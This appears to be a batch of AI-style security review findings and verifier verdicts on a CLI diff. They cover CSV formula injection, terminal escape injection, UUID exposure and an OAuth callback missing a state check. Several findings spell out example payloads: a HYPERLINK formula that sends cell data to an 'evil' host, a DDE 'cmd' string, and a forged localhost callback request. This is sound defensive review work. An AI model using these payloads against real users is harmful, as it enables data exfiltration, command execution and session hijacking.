samples.summary: CSV output has no formula-injection neutralization; `--format csv` is now promoted as the human path
samples.evidence: `csvEscape` (packages/cli/src/output/csv.ts:15-24) only quote-escapes `,`, `"` and `\n`. It does not neutralize leading `=`, `+`, `-`, `@`, TAB or CR. This formatter is reached by (a) every `--format csv` command via `format()` -> `formatCsv` (packages/cli/src/output/formatter.ts:50), which this diff extends to `status`, `ctx list` and single-object payloads and which docs/design/cli.md now advertises as the human-readable path, and (b) `sheets export <doc> out.csv` (packages/cli/src/commands/sheets-export.ts:46), which writes straight to disk. Attack: a co-member of a shared workspace sets a cell value or a document title to `=HYPERLINK("http://evil/?d="&A2,"ok")` or `=cmd|'/c calc'!A0`; the victim runs `wafflebase sheets export <doc> out.csv` (or `wafflebase sheets cells get --format csv > out.csv`) and opens the file in Excel/LibreOffice, which evaluates the formula — data exfiltration or, with DDE, command execution. Pre-existing in csv.ts (not added by this diff), but the diff widens and documents the CSV path, so it is the natural place to fix. Standard mitigation is prefixing a leading `=`/`+`/`-`/`@`/TAB/CR value with `'` or wrapping it in quotes with a leading apostrophe.

samples.summary: Table renderer emits server-controlled strings to the terminal without stripping control/ANSI escape sequences
samples.evidence: `cell()` (packages/cli/src/output/table.ts:9) and the array path (table.ts:46,53) pass values through bare `String(...)` and `console.log` them. Values come from the API (`output(res.data, fmt, opts.quiet)` in docs.ts:88/125, cells.ts:31, tabs.ts:21, ...). A workspace co-member who names a document `[2J[1;1H...` or embeds OSC sequences can rewrite the victim's terminal display when they run `wafflebase docs list --format table`, hiding rows or spoofing output that an operator then acts on. The default JSON path is safe because `JSON.stringify` escapes U+0000-U+001F, and `cell()`'s new nested-object branch inherits that escaping — but top-level strings do not. The diff extends `formatTable` to render single objects (table.ts:31-37), adding `status`, `docs get` and `schema` to the set of payloads rendered this way, so it broadens the surface rather than creating it.

samples.summary: `status` / `ctx list` now print full workspace UUIDs where they previously truncated to 8 chars
samples.evidence: buildStatus returns `workspaceId: session.activeWorkspace` (packages/cli/src/commands/status.ts:50) and buildWorkspaceList returns `id: ws.id` (packages/cli/src/commands/ctx.ts:28). The replaced code printed `session.activeWorkspace.slice(0, 8)` and `ws.id.slice(0, 8)`. Combined with `email` (status.ts:48) and `server` (status.ts:49), `wafflebase status` now emits a complete workspace-identity record on stdout, which agents and CI jobs routinely capture into logs/transcripts that are less protected than the 0600 session file. No secret material (accessToken/refreshToken) is exposed, so impact is limited to identifier disclosure; `ctx switch` legitimately needs the full ID, so this may well be the intended trade-off — flagging it so the exposure is a deliberate decision rather than a side effect of the reshape.

samples.summary: CLI OAuth loopback callback server accepts any `code` with no `state`/nonce binding (login CSRF / session fixation)
samples.evidence: `startCallbackServer` (packages/cli/src/commands/login.ts:168-227) serves `/callback` on 127.0.0.1 and resolves with whatever `code` query parameter arrives (line 177), with no `state` nonce generated at line 36 (`${server}/auth/github?mode=cli&port=${port}`), no Origin/Sec-Fetch-Site check, and no per-attempt secret. Any web page the victim visits during the 30s window (login.ts:229) can issue a no-CORS GET to `http://127.0.0.1:<port>/callback?code=<attacker_code>`; the CLI then exchanges the attacker's code (login.ts:56) and persists the attacker's tokens to ~/.wafflebase/session.json, so the victim's subsequent `wafflebase docs create`/`sheets import` writes their data into the attacker's workspace. I could not confirm exploitability end to end: the backend receives `port` in the authorize URL and may bind the issued code to it, which would force the attacker to guess the victim's ephemeral port — hence low confidence. Entirely outside this diff (pre-existing), surfaced because the diff is the auth/session-surfacing change under review. Searched: packages/cli/src for `state`, `nonce`, `csrf`, `Origin` in the login/callback path; found none.
searchedFor: grep for Origin/Sec-Fetch header checks in login.ts

verdict.reason: Verified directly in the repo. packages/cli/src/output/csv.ts:15-24 defines csvEscape, which stringifies the value and quote-wraps it only when it contains ',', '"' or '\n' (line 20); there is no neutralization of a leading '=', '+', '-', '@', TAB or CR. Quote-wrapping alone does not help, since spreadsheet apps still evaluate a quoted leading '=' on import. Both claimed sinks exist: (a) formatter.ts:50 routes every --format csv command through formatCsv, printed to stdout by output() at formatter.ts:59-62; (b) sheets-export.ts:46 calls formatCsv(res.data) and writes the result straight to disk via writeFileSync at sheets-export.ts:51, with csv as the default whenever the file extension is not .json (detectFormat, sheets-export.ts:18-20). A repo-wide grep for sanitization/formula-neutralization found nothing on this path (only unrelated HTML-comment escaping in scripts/agent/severity.mjs), so no guard makes it unreachable, and csv.ts is the last transform before bytes hit disk. The attacker-controlled-input premise is confirmed and is broader than the reviewer stated: docs/design/sharing.md:11-19 documents share links carrying an 'editor' role with explicit anonymous, no-login access, and lines 69-70 note every workspace member holds rw on the document, so even an unauthenticated editor-link holder can plant '=HYPERLINK(...)' or a DDE payload in a cell that the victim then exports and opens. This is CSV formula injection (CWE-1236), which falls in the Security lens's injection / unsafe-input-handling lane with exfiltration-to-RCE impact. The reviewer's acknowledgement that the flaw predates the diff is not a valid refutation ground, since I am to judge only whether the defect is real and blocking, not whether the change introduced it.

finding.evidence: `startCallbackServer` (packages/cli/src/commands/login.ts:168-227) serves `/callback` on 127.0.0.1 and resolves with whatever `code` query parameter arrives (line 177), with no `state` nonce generated at line 36 (`${server}/auth/github?mode=cli&port=${port}`), no Origin/Sec-Fetch-Site check, and no per-attempt secret. Any web page the victim visits during the 30s window (login.ts:229) can issue a no-CORS GET to `http://127.0.0.1:<port>/callback?code=<attacker_code>`; the CLI then exchanges the attacker's code (login.ts:56) and persists the attacker's tokens to ~/.wafflebase/session.json, so the victim's subsequent `wafflebase docs create`/`sheets import` writes their data into the attacker's workspace. I could not confirm exploitability end to end: the backend receives `port` in the authorize URL and may bind the issued code to it, which would force the attacker to guess the victim's ephemeral port — hence low confidence. Entirely outside this diff (pre-existing), surfaced because the diff is the auth/session-surfacing change under review. Searched: packages/cli/src for `state`, `nonce`, `csrf`, `Origin` in the login/callback path; found none.
searchedFor: grep for Origin/Sec-Fetch header checks in login.ts

verdict.reason: Verified independently: the CLI loopback OAuth callback has no state/nonce binding and no origin checks, and nothing elsewhere in the flow supplies one. login.ts:36 builds the authorize URL with only mode+port (no state); the handler at login.ts:168-182 accepts any request to /callback carrying a `code` query param and resolves the login promise (login.ts:223-226) without checking a state parameter, Origin, Sec-Fetch-Site, or any per-attempt secret. It is the only HTTP server in packages/cli (grep for createServer and /callback matches only login.ts), so there is no alternate hardened path. The only per-attempt secret in the system is generated but never delivered to the CLI: CliAuthStore.createState mints `csrf` (cli-auth.store.ts:25, returned at :34), but github-auth.guard.ts:24 destructures only { stateToken } and auth.controller.ts:120-129 uses only state.mode/state.port, ignoring csrf; a repo-wide case-insensitive grep for csrf shows no other consumer. The port-binding hypothesis that could have refuted exploitability does not hold: createCode stores only { userId, expiresAt } (cli-auth.store.ts:49-54) and cliExchange validates only the code (auth.controller.ts:146-153), so an attacker can mint a code for their own account by requesting /auth/github?mode=cli&port=<any valid port> and reading the redirect target (auth.controller.ts:127-129), then have a malicious page issue simple no-CORS GETs to http://127.0.0.1:<guessed ephemeral port>/callback?code=... during the 30s window (login.ts:229-237). The CLI exchanges it (login.ts:50-60) and persists the attacker tokens (login.ts:138), so the victim's subsequent CLI writes land in the attacker's workspace. This sits in the crypto/auth lane (login CSRF / session fixation via missing state binding); major is right because exploitation still requires guessing the victim's random ephemeral port within the window.

finding.summary: CSV output does not neutralize spreadsheet-formula prefixes; this change adds new server-controlled sinks into the CSV path
finding.evidence: `csvEscape` (packages/cli/src/output/csv.ts:15-24) only quotes on `,`/`"`/`\n`; it never prefixes values that begin with `=`, `+`, `-`, `@`, tab or CR. Every value it emits is server-supplied and, in a shared workspace, settable by another member (document titles, cell values/formulas, and — newly reachable via this diff — workspace `name` through `wafflebase ctx list --format csv`, `buildWorkspaceList` in packages/cli/src/commands/ctx.ts:27). Attack: a collaborator renames a workspace or document to `=cmd|'/c calc'!A0` (or `=HYPERLINK("http://evil/"&A1)` for exfiltration); the victim runs `wafflebase ctx list --format csv > ws.csv` (a flow the diff's own docs now advertise as "the human path") and opens it in Excel/LibreOffice/Sheets, which evaluates the payload. The new `cell()` helper in packages/cli/src/output/table.ts:9 was written to "mirror what formatCsv already does", so the same unescaped convention is being propagated rather than fixed. Pre-existing in csv.ts, but the diff widens the reachable data set.

verdict.reason: The claimed code is present exactly as described: csvEscape (csv.ts:15-24) quotes only when the value contains a comma, a double quote, or a newline, and never neutralizes values beginning with =, +, -, @, tab, or CR. The path is reachable: formatter.ts:49-50 routes any command's --format csv to formatCsv, and ctx.ts:79-83 feeds buildWorkspaceList (ctx.ts:27-31 passes ws.name verbatim) into it; sheets-export.ts:46 likewise writes formatCsv of server-returned cell data to a file or stdout. No neutralization exists anywhere in packages/cli/src (grep for formula/sanitiz finds nothing), and output.test.ts:74-108 asserts only comma/quote/newline escaping, confirming no upstream guard. Values are server-supplied and settable by other workspace members (workspace names, doc titles, cell values/formulas), and the docs advertise redirecting CSV output for human consumption (cli.md:553), so a collaborator-planted =HYPERLINK or DDE payload lands in a file the victim opens in Excel/LibreOffice/Sheets. This is CSV/formula injection, within the Security lens's injection / unsafe output-handling lane; major severity fits since exploitation depends on the victim opening the file (and clearing a warning for DDE payloads). None of the refutation grounds apply.
